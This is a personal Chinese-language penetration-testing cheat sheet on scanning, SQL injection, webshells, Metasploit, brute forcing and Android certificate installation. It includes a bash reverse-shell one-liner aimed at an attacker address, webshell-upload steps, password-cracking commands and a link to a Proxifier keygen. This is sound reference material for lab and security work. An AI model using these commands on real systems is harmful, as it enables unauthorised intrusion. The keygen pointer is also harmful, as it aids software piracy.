# 信息搜集

## nmap - 端口扫描

nmap（Network Mapper）是快速的网络扫描工具。它可以用作主机发现、端口扫描、服务识别、操作系统识别工具

参数：`nmap 选项 目标`。[官方文档](https://nmap.org/man/zh/index.html)

```shell
$target = "example.com"
nmap -sn $target      # 主机发现
nmap -Pn -sS $target  # 扫描开放端口
nmap -Pn -sS -sV $target -p 443  # 识别端口的服务
```

### 基础用法

```shell
# 指定目标
nmap "example.com"      # 域名
nmap "192.168.0.1"      # IP地址
nmap "example.com/24"   # IP段
nmap "192.168.0.1-254"  # IP范围

# 指定端口。不指定的时候扫1000个常用端口
nmap "example.com" -p "21,443"
nmap "example.com" -p "1-65535"  # 全端口扫描
nmap "example.com" -F            # 快速扫描，只扫100个最常用的端口

# 其他
nmap --script="script.lua"  # 脚本扫描
nmap -v "example.com"       # verbose。还有-vv, -vvv，更详细；类似的还有调试级别d
nmap -T4 "example.com"      # 时间间隔控制，T1~T5。默认T3，快速扫描一般用T4
```

**扫描选项**

1. Ping扫描（主机发现，确认主机存活）
   - `-sL`：列表主机发现。不发送报文，仅通过反向域名解析发现主机
   - `-sn`：无端口扫描（no port scan），也叫Ping扫描，扫完不继续进行端口扫描
   - `-Pn`：无Ping扫描（no ping scan），跳过Ping扫描
2. 端口扫描（寻找开放端口）
   - `-sS`：SYN半连接扫描。只发SYN，不回复ACK。速度快，隐蔽性高；需要管理员权限
   - `-sT`：TCP连接扫描。尝试完成TCP握手。速度慢，易被目标日志记录；结果更准确
   - `-sU`：UDP扫描
   - 其他：主要用来绕过防火墙、探测防火墙规则
3. 特征扫描（发送报文，根据服务器返回报文的特征推断服务器信息）
   - `-sV`：服务探测。识别端口对应的服务名、版本号
   - `-O`：操作系统探测。识别目标的操作系统

**输出选项**：使用以下选项后，nmap将结果以指定格式写入文件（不改变stdout打印的结果）

```shell
nmap -oN "scan.nmap" "example.com"  # 标准输出
nmap -oX "scan.xml" "example.com"   # XML输出

nmap --resume "scan.nmap"  # 恢复中断的扫描。不能使用其他参数，不支持XML日志
```

TCP握手复习：客户端发送SYN包，服务器返回SYN-ACK包，客户端回复ACK包。中途任意一方连接出错，就发RST包中断连接

- open：端口开启。即有应用程序在监听该端口，服务器发回SYN-ACK报文
- closed：端口关闭。即没有应用程序监听该端口，服务器发回RST报文
- filtered：被防火墙等安全措施阻挡，无法判断端口是否开启。即服务器没有发回报文
- unfiltered：未被阻挡，且无法判断端口是否开启。进行`-sA`扫描时服务器发回RST报文

### 隐蔽选项

NA

## watweb - 指纹识别

```shell
$URL = "example.com"
whatweb -v --log-xml=log.xml $URL

# Aggression和插件
whatweb -a 1 $URL  # 只做一次请求
whatweb -a 3 $URL  # 先请求一次，根据结果调用相应插件继续请求
whatweb -p md5 $URL  # 插件

# Header
$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$COOKIE = "name1:value1; name2:value2"
whatweb --user-agent $UA --cookie $COOKIE --proxy "localhost:8080" $URL
```

## tscan - 综合扫描器

gui

## fscan - 综合扫描器



## 测绘工具

- FOFA：https://fofa.info/
- Shodan：https://www.shodan.io/（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）
- 钟馗之眼：https://www.zoomeye.org/
- 鹰图平台：https://hunter.qianxin.com/
- https://quake.360.net/quake/#/index
- https://x.threatbook.cn

# 漏洞分析

## searchsploit - 漏洞搜索

开源漏洞数据库[Exploit DB](https://www.exploit-db.com/)的命令行工具

```shell
searchsploit Mail Masta   # 查找有关Mail Masta的漏洞。多个关键词是AND关系
searchsploit -x 41438     # 查看漏洞详情
```

## sqlmap - SQL注入工具

### 注入点

```bash
sqlmap -u "example.com?id=1"             # GET参数
sqlmap -u "example.com" --data="id=1"    # POST参数
sqlmap -u "example.com" --cookie="SESSION=*"  # Cookie
sqlmap -r "数据包.txt"

sqlmap -u "example.com?id=1&page=1" -p id     # 指定扫描的参数
```

GET和POST参数会被自动当作注入点；也可以用星号`*`指定注入位置，sqlmap会尝试将星号替换为payload。所有Request参数都可以注入，比如cookie，user-agent，其他header

### Payload

sqlmap的payload由以下几部分组合而成：`<prefix> <vector> <comment> <suffix>`，各部分由以下配置文件提供：

```
/usr/share/sqlmap/data/xml/
    ├─boundaries.xml  --> prefix, suffix
    └─payloads/       --> vector, comment
```

payload格式如下（为了方便理解，只包含大致结构，细节可参考`payloads/`中）

```xml
<test>
    <title>布尔盲注</title>
    <stype>6</stype>   <!-- 注入类型（1~6表示布尔盲注、报错注入、inline、堆叠、时间、Union）-->
    <clause>0</clause> <!-- 此payload在什么位置生效，比如Where语句。0表示全部 -->
    <where>1</where>   <!-- 如何添加前后缀 -->
    <vector>AND [INFERENCE]</vector> <!-- 攻击向量 -->
    <request>   <!-- 测试注入点是否可用 -->
        <payload>AND [RANDNUM]=[RANDNUM]</payload>
    </request>
    <response>  <!-- 判断注入是否成功 -->
        <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
    </response>
</test>
```

### 其他

**预处理**：可以用脚本预处理payload。自带脚本位于`/usr/share/sqlmap/tamper`

```bash
sqlmap -u "example.com?id=1" --tamper=if2case.py ---suffix="#"
```

**扫描级别和风险**：扫描级别越高，发送的请求越多；风险越高，破坏数据完整的可能性越高，如插入、删除、写文件

```bash
sqlmap -u "example.com" -p id --level=3 --risk=1
```

**技术**：sqlmap支持BEUSTQ六种注入技术（布尔盲注、报错注入、Union注入、堆叠查询、时间盲注、嵌套查询）

```bash
sqlmap -u "example.com?id=1" --technique=U
```

## xray - 综合漏洞扫描

[文档](https://docs.xray.cool/tools/xray/BasicIntroduction)

```powershell
./xray_windows_amd64.exe version  # 查看软件版本
./xray_windows_amd64.exe genca    # 生成CA证书。须手动安装，并把证书留在原地
./xray_windows_amd64.exe          # 生成配置文件config.yml。须手动修改hostname_allowed
./xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xray-__datetime__.html
# 开启代理并被动扫描
```

# 漏洞利用

# 后渗透

## netcat - 建立&监听连接

简称nc，有建立、监听TCP/UDP连接的功能，可用于简单通信、发送任意数据包。在渗透测试中还常用作反弹shell

**基本操作**

```shell
# 监听端口（服务端）
nc -l -p 80
nc -l -p 80 < index.html  # 监听80端口，建立连接后发送index.html

# 连接主机（客户端）
nc example.com 80
nc example.com 80 > index.html  # 连接主机的80端口，建立连接后将受到数据保存为index.html
```

**反向连接**

1. 攻击者在自己的机器上监听某个端口：`nc -l -p 4444`
2. 目标主机运行下面的指令。具体含义是：`bash -i`以交互模式启动bash；重定向符`>& dev/tcp/addr/port`将`stdout, stderr`输出到TCP链接伪文件（也就是将输出通过TCP发送到攻击者主机），`0>&1`表示将`stdin`重定向到`stdout`，两个重定向的综合效果是从攻击者主机获取命令、执行后将结果发回攻击者主机

```bash
bash -i >& "/dev/tcp/$attacker_addr/4444" 0>&1
```

3. 建立连接后，在攻击机的终端上输入命令即可操作目标机命令行
3. 上一步建立的是虚拟终端（Pseudo-TTY，PTY），部分操作需要使用终端（TTY）。可用以下命令获取TTY：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 蚁剑 - WebShell管理

[AntSword文档](https://www.yuque.com/antswordproject/antsword)，[AntSword-Loader](https://github.com/AntSwordProject/AntSword-Loader)，[AntSword](https://github.com/AntSwordProject/antSword)，[WebShell](https://github.com/AntSwordProject/AwesomeScript)

安装流程：下载Loader并运行，用Loader下载本体，然后重启Loader就能看到管理界面

将WebShell脚本上传到服务器，在主界面右键 - 添加数据 - 填写WebShell的URL和连接密码（比如WebShell仓库里的脚本都是用`ant`参数控制脚本，连接密码就是ant）

# 综合工具

## Proxifier - 代理

可以用[Proxifier注册机](https://github.com/y9nhjy/Proxifier-Keygen?tab=readme-ov-file)破解

## Burp Suite - 抓包

下载证书：`http://burp/`

[ProxyHttpRequestResponse](https://portswigger.github.io/burp-extensions-montoya-api/javadoc/burp/api/montoya/proxy/ProxyHttpRequestResponse.html)

### 插件

[编写Burp Suite插件](https://t0data.gitbooks.io/burpsuite/content/chapter16.html)

[Creating Burp Extensions](https://portswigger.net/burp/documentation/desktop/extend-burp/extensions/creating)

#### HaE

[HaE](https://github.com/gh0stkey/HaE)（Highlighter and Extractor）是数据标注与提取工具

## Yakit

[Yakit: 集成化单兵安全能力平台](https://yaklang.com/en/products/intro/)

### MITM

抓包工具

### Web Fuzzer

重放与爆破，将Burp Suite的Repeater和Intruder合为一体

Web Fuzzer中可使用模糊测试标签（fuzztag）生成数据，它由两层花括号包裹起来，如`{{int(1-5)}}`。参考：[标签一览](https://yaklang.com/docs/yakexamples/fuzztag/)

### Yak-Lang

极简、缝合了各种语法糖的语言，自带丰富的网络、安全相关功能

```javascript
// 字符串
name = "John" + `Doe`
println("id=%d,name=%v" % [1, name])
println(f"Hello, ${name}")
sprintf("{%d, %v}", 1, name)
nums = x"id={{int(1-10)}}"  // x-string，展开fuzztag生成一个列表

// 列表与字典
arr = [1, 2, 3]
arr.Append(4)
user = {"name": "John", "age": 42}

// 控制流
// 支持python风格for-in，golang风格for-range和C风格的三段式写法
for user in users {
    if user["age"] > 18 {
        user["category"] = "Adult"
    } else if user["age"] > 0 {
        user["category"] = "Child"
    }
}
for (i=0; i<10; i++) {
    dump(i)
}

// 函数
myFunc = func() {    // 声明函数变量
    println("Hello World")
}
func myFunction() {  // “正常”函数定义。也可用def关键字定义
    println("Hello World")
}
myFunction = () => { // 箭头函数
    println("Hello World")
}
```

库函数速查：

- 打印：`println`打印换行；`dump`打印变量信息；`desc`打印结构体信息
- [文档](https://yaklang.com/docs/yak-basic/cap7-buildin-functions)



### 插件

插件仓库 - 本地 - 新建插件。常用的插件种类有两类：

1. **独立模块**：如Yak原生插件，单独一个进程运行，通过Webhook与主进程通信
2. **嵌入式模块**：如MITM模块，由Yakit主进程直接调用。嵌入式模块崩溃、内存泄漏都会影响主进程



```javascript
yakit.AutoInitYakit()   // 建立与主进程的通信
// 输出到插件日志
yakit.Info("Hello This is a info message")
yakit.Warn("Warning!!! Warning: %v", now())
yakit.Error("Error!? Impossible")
// 进度条
yakit.SetProgress(0.1)
sleep(1)
yakit.SetProgress(0.9)
// 输出表格
yakit.EnableTable("测试表格", ["id", "name"])
yakit.Output(yakit.TableData("测试表格", {"id":10324, "name":"John"}))
```





## Metasploit Framework

Metasploit Framework是集合了大量渗透模块的管理器，它可以管理模块、调用模块、加载模块运行环境等。模块分为以下几类，覆盖了渗透测试各个阶段：

- **Auxiliary**：模糊测试、枚举
- **Exploit**：利用漏洞，比如引发缓冲区溢出实现RCE
- **Payload**：利用成功后执行的代码，比如反弹Shell、植入后门
  - **Encoder**，**Evasion**：规避防护系统
  - **Nop**：插入Nop指令，辅助各种溢出漏洞
- **Post**：后渗透，如提权、持久化、清理痕迹

基础流程是：

```shell
msfconsole  # 进入Metasploit Framework Shell

search type:exploit description:overlayfs  # 搜素模块
info 8                    # 查看模块信息，可以用搜素结果编号或者完整模块路径
use 8                     # 调用模块
show options              # 查看模块配置选项
set RHOSTS example.com    # 配置模块
set payload payload/linux/x64/shell/reverse_tcp  # 配置payload
exploit                   # 进行攻击
```

### Auxiliary

`scanner/ssh/ssh_login`：SSH爆破，也可以用于建立连接

# 模糊测试

## dirb - 目录扫描

简单的目录扫描工具。能实现类似功能的还有dirbuster（GUI）和ffuf（模糊测试）等

```shell
dirb "example.com"  "/usr/share/dirb/wordlists/big.txt" -o "output.txt"
```

| 参数 | 作用                |
| ---- | ------------------- |
| `-a` | User-Agent          |
| `-X` | eXtension，如`.php` |
| `-z` | 延迟（毫秒）        |
| `-H` | 请求头，            |

```shell
$URL = "example.com"
$WORDS = "/usr/share/dirb/wordlists/big.txt"
$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$COOKIE = "name1:value1; name2:value2"

dirb $URL $WORDS -a $UA -c $COOKIE -o "output.txt"  # 基本扫描
dirb $URL -z 100 -X .php,.html,.txt   # 请求之间间隔100ms；在词典每项后面加上后缀
```

## ffuf - 模糊测试

```shell
ffuf -v
```

## hydra - 多协议密码爆破

```shell
hydra -l username -P password.txt ssh://target_addr
```

## 字典

kali自带的字典包括：

- `/usr/share/worelists`

# 其他工具

## John The Ripper - 哈希爆破

John The Ripper在已知散列值（以及使用的散列算法）时用于爆破原始数据，常用于密码爆破

```shell
zip2john secret.zip > hash.txt       # 提取压缩包哈希
john --wordlist=rockyou.txt hash.txt # 爆破zip压缩包密码
```

## hashcat - 哈希爆破

```shell
hashcat -a ${攻击模式} -m ${哈希类型} ${哈希值} ${字典}
hashcat -a 0 -m 16500 $jwt $wordlist  # 爆破JWT
```

# 其他

## 安装CA证书

CA证书是数字证书认证机构（Certificate Authority）颁发的电子证书，一般特指SSL/TLS证书。设备与服务器建立SSL/TLS连接时，需要验证证书有效性：

1. 设备请求服务器`example.com`，服务器发回服务器证书、签发证书的CA机构信息
2. 设备比对服务器证书、本地信任库，若匹配到了则信任此服务器
3. 若未匹配到，则向签发证书的CA机构服务器发起请求，CA服务器发回自己的证书、上级CA机构信息
4. 用和第二步相同的方法判断此CA服务器是否可信，若可信，则与它建立连接，询问`example.com`是否可信；若不可信，则重复3-4，请求再上一级的CA服务器
5. 若最终判断结果是`example.com`可信，就与它继续建立连接；否则，中止SSL连接

想要用代理抓包时需要手动添加“不安全”的证书以获取传输数据

- Linux：base64编码的文本，后缀`.pem`，`.crt`，`.key`
- Windows：二进制文件，后缀`.der`，`.cer`
- Android：两种格式都行，但是文件名要改为`PEM格式证书哈希值.0`

格式转换详见Linux笔记 - 其他指令 - openssl x509

### Windows

双击证书文件，安装证书，将证书放入下列存储 - 受信任的根证书颁发机构

### Linux

```bash
sudo cp cacert.crt /usr/local/share/ca-certificates  # 复制到系统证书目录
sudo update-ca-certificates                          # 安装证书

# 检查证书是否成功安装
cat cacert.crt   # 查看证书内容，复制密钥的一部分
sudo cat /etc/ssl/certs/cacert.crt | grep L4zOd3  # 查找刚才复制的一小段。若有结果则安装完成
```

### Android

- **Android 7前**：用户证书和系统证书有相同权限，直接安装为用户证书即可
- **Android 7-13**：用户证书和系统证书分开，系统证书存储于`/system/etc/security/cacerts`。但是普通用户没有访问system目录的权限，root用户也可能没有写system目录的权限
- **Android 14后**：系统证书除了system盘，还安装在`/apex/com.android.conscrypt/cacerts`，由apex机制管理
- 部分应用程序会使用**证书锁定**（SSL/TLS Pinning），即只信任程序内置的证书，需要逆向或者用[Frida](https://github.com/frida/frida) Hook

以下方法适用于Android 7-13

**方法1**：adb获取root权限，直接操作系统证书目录。不过adb可能无法获得足够的权限

```shell
adb root
adb remount
adb push 9a5ba575.0 /system/etc/security/cacerts/
```

**方法2**：在adb shell获取超级用户权限，将系统盘改为可写，并写入证书。若显示`Read-only file system`，无法获取权限，说明system盘使用了只读文件系统，要用方法3

```shell
# 获取super user权限。可能需要在手机上点确认。若shell的$变为#说明成功
su
# 获取写系统分区权限。不同系统需要的命令不同，建议逐一尝试
mount -o rw,remount /system
mount -o rw,remount /
chmod 777 /system
# 将证书复制到系统证书目录
cp /sdcard/Download/9a5ba575.0 /system/etc/security/cacerts/
```

**方法3**：magisk加载模块：首先[安装magisk](./android.md#magisk)，安装[MoveCertificate模块](https://github.com/ys1231/MoveCertificate)，将证书复制到`/data/local/tmp/cert`，重启手机即可生效

**其他**：没有测试过，上面的方法都用不了的时候可以考虑

- DNA修改system.img：使用安卓固件解包打包工具[DNA](https://github.com/ColdWindScholar/D.N.A3)，修改system.img映像并重新刷入
- [HTTP Toolkit](https://httptoolkit.com/docs/guides/android/)工具抓包，原理似乎是挂载了一个内存文件系统，参考[这篇文章](http://91fans.com.cn/post/certificate/)。其中使用的命令如下

```shell
# 将系统证书复制到临时文件夹
mkdir -m 700 /data/local/tmp/htk-ca-copy
cp /system/etc/security/cacerts/* /data/local/tmp/htk-ca-copy/
# Create the in-memory mount on top of the system certs folder
mount -t tmpfs tmpfs /system/etc/security/cacerts
# 将系统证书、要添加的证书复制到内存文件系统
mv /data/local/tmp/htk-ca-copy/* /system/etc/security/cacerts/
cp /data/local/tmp/c88f7ed0.0 /system/etc/security/cacerts/
# Update the perms & selinux context labels, so everything is as readable as before
chown root:root /system/etc/security/cacerts/*
chmod 644 /system/etc/security/cacerts/*
chcon u:object_r:system_file:s0 /system/etc/security/cacerts/*
```

## VMWare

### 网络设置

在安装 VMware 之后，宿主机上会出现几个相关的虚拟设备，可以在编辑 - 虚拟网络编辑器配置。虚拟机连接网络有三个方式，在虚拟机 - 设置 - 网络适配器配置

- 桥接：虚拟机连接到虚拟交换机VMnet0，相当于一台独立的主机接入局域网
- NAT：连接到虚拟网卡VMnet8，通过NAT与外部设备通信，外部设备无法访问虚拟机
- 仅主机：连接到虚拟网卡VMnet1，不能与外部通信，只能和宿主机、其他连接到VMnet1的虚拟机通信

### 共享文件

1. 确保安装了VMWare Tools。创建虚拟机时一般会默认安装，若虚拟机 - 安装VMWare Tools为灰色则已经安装
2. 选中要设置的虚拟机，打开虚拟机 - 设置 - 选项 - 共享文件夹，选择总是启用，点击添加，然后按提示操作
3. 共享文件夹会挂载到`/mnt/hgfs`。若没有，则用此命令手动挂载：`sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other`

### 显示设置

VMWare Tools会在窗口大小改变时更改虚拟机分辨率。可在编辑 - 首选项 - 显示中关闭自动适应分辨率。如果还不行，可参考[这篇文章](https://knowledge.broadcom.com/external/article/331544/setting-a-display-topology-at-vm-boot-ti.html)，在宿主的`<虚拟机>/虚拟机名.vmx`文件加上下面的配置禁止更改

```
guestInfo.svga.wddm.bootTopology="1280x720"
guestInfo.svga.wddm.modeset="FALSE"
guestInfo.svga.wddm.restrictModesToBootTopology="TRUE"
```

### 命令行界面

[Syntax of vmrun Commands](https://techdocs.broadcom.com/us/en/vmware-cis/desktop-hypervisors/fusion-pro/13-0/using-vmware-fusion/using-the-vmrun-command-to-control-virtual-machines/running-vmrun-commands/syntax-of-vmrun-commands.html)

## 靶场

### Vulhub

[项目主页](https://vulhub.org/)

1. 安装Docker：`curl -s https://get.docker.com/ | sh`
2. 启动Docker：`sudo service docker start`
3. 下载Vulhub：`git clone https://github.com/vulhub/vulhub.git`
4. 选择环境：`cd flask/ssti`
5. 启动靶场：`docker compose up -d`
6. 访问靶场：根据`README.md`的指示复现漏洞
7. 关闭靶场：`docker compose down`。为了避免被他人恶意利用，测试结束后一定记得关闭环境

过程中可能报以下错误：

- **`docker: Got permission denied`**：没有docker权限，需要使用sudo或者添加用户组

```bash
sudo docker compose up

sudo groupadd docker
sudo usermod -aG docker $USER
newgrp docker
```

- **`unexpected keyword argument 'ssl_version'`**：使用`docker compose up -d`指令启动。不要用官方教程的`docker-compose`，那是旧版本的
- **加载超时**：docker官网被墙了，需要开代理或者换镜像站，设置方法是在`/etc/docker/daemon.json`中加入如下内容（代理或镜像选一个即可）然后重启

```json
{
  "proxies": {
    "http-proxy": "http://proxy.example.com:3128",
    "https-proxy": "https://proxy.example.com:3129",
    "no-proxy": "*.test.example.com,.example.org,127.0.0.0/8"
  }

  "registry-mirrors": ["https://mirror.com"]
}
```

### web靶场

1. 安装[小皮面板](https://www.xp.cn/product-download)（Linux），或者[phpStudy](https://www.xp.cn/php-study)（Windows）
2. 用浏览器登录面板，然后在网站和数据库界面分别安装apache和mysql
3. 下载pikachu，并复制到`/xp/www`
4. 在面板的“网站”界面选择添加网站 - 手动创建，域名随便绑一个端口，根目录`/xp/www/pikachu`（即上一步复制的目录），然后点下一步
5. 随便选个php版本，并创建MySQL数据库。将数据库账号、密码写进`config.inc.php`（位于`/xp/www/pikachu/inc`）
6. 打开网站（可在面板 - 网站点击网站名打开），访问`/install.php`，点击初始化

## 常见默认端口

| 端口  | 常见服务      | 备注           |
| ----- | ------------- | -------------- |
| 21    | FTP           |                |
| 22    | SSH           |                |
| 23    | TELNET        |                |
| 53    | DNS           |                |
| 80    | HTTP          |                |
| 443   | HTTPS         |                |
| 445   | SMB           | 微软的文件共享 |
| 1433  | MSSQL         |                |
| 1521  | Oracle        |                |
| 3306  | MySQL         |                |
| 3389  | RDP           | 远程桌面       |
| 5432  | pgsql         |                |
| 6379  | Redis         |                |
| 8080  | tomcat, jboss |                |
| 27017 | MongoDB       |                |

## User-Agent

格式：`User-Agent: <product> / <product-version> <comment>`；[UA列表](https://gist.github.com/pzb/b4b6f57144aea7827ae4)

```
# Windows
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)

# Windows端微信浏览器（2025.07.27，微信4.0.6）
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254061a) XWEB/14307 Flue

# Windows端微信小程序（2025.07.27，微信4.0.6）
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254061a) XWEB/14307

# MUMU模拟器微信小程序
Mozilla/5.0 (Linux; Android 12; M2102J2SC Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 MMWEBID/7854 MicroMessenger/8.0.57.2820(0x28003933) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android
```

## 搜索引擎

| Operator   | 含义               | 示例                    | 备注/可尝试的关键词          |
| ---------- | ------------------ | ----------------------- | ---------------------------- |
| `site`     | 指定网站           | `insite:example.com`    |                              |
| `inurl`    | URL中包含指定词    | `inurl:id=`             | `id=, file=`                 |
| `intitle`  | 网页标题包含指定词 | `intitle:"index of"`    | `phpinfo, index of`          |
| `intext`   | 网页内容包含指定词 | `intext:"@gmail.com"`   |                              |
| `filetype` | 文件类型           | `filetype:cfg`          | `env, bak, sql, zip, tar.gz` |
| `link`     | 链接到指定页面     | `link:example.com/news` | 最好单独使用                 |

## 在线工具

- 信息收集
  - [爱站网Whois反查](https://whois.aizhan.com/)
  - [ip138](https://www.ip138.com/) - 子域名、旁站查询
  - [crt.sh](https://crt.sh/) - 通过证书查找相关网站

[CMD5](https://www.cmd5.com) - Hash反向查询

javascrip反混淆工具：https://deobfuscate.io/、http://www.jsnice.org/

[GTFOBins](https://gtfobins.github.io/) - 可用于提权的Linux命令
